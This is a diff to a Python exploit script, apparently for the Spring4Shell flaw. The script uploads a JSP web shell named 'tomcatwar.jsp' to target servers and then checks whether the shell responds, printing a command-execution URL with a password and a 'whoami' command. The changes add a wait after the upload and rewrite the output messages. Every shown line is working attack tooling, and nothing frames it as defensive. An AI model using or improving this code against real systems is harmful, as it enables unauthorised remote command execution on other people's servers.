@@ -10,6 +10,7 @@ urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 from urllib.parse import urljoin,urlparse
 from threading import Thread
 from sys import exit
+import time
 
 
 class Exploit(Thread):
@@ -37,6 +38,7 @@ class Exploit(Thread):
                           timeout=15,
                           allow_redirects=False,
                           verify=False)
+            time.sleep(10) ## Wait for the upload to complete
             shellurl = urljoin(self.url, 'tomcatwar.jsp')
             shellgo = requests.get(shellurl,
                                    timeout=15,
@@ -44,7 +46,7 @@ class Exploit(Thread):
                                    stream=True,
                                    verify=False)
             if shellgo.status_code == 200:
-                print(f"Vulnerable，shell ip:{shellurl}?pwd=j&cmd=whoami")
+                print(f"Vulnerable，shell url: {shellurl}?pwd=j&cmd=whoami")
 
             ## Depending on the server, the shell url may be in tomcats root folder
             else:
@@ -57,7 +59,7 @@ class Exploit(Thread):
                                    stream=True,
                                    verify=False)
                 if shellgoroot.status_code == 200: 
-                    print(f"Vulnerable，shell ip:{shellurlroot}?pwd=j&cmd=whoami")
+                    print(f"Vulnerable，shell url: {shellurlroot}?pwd=j&cmd=whoami")
                 else:
                     print(f"\033[91m[" + '\u2718' + "]\033[0m", self.url,
                         "\033[91mNot Vulnerable!\033[0m ")
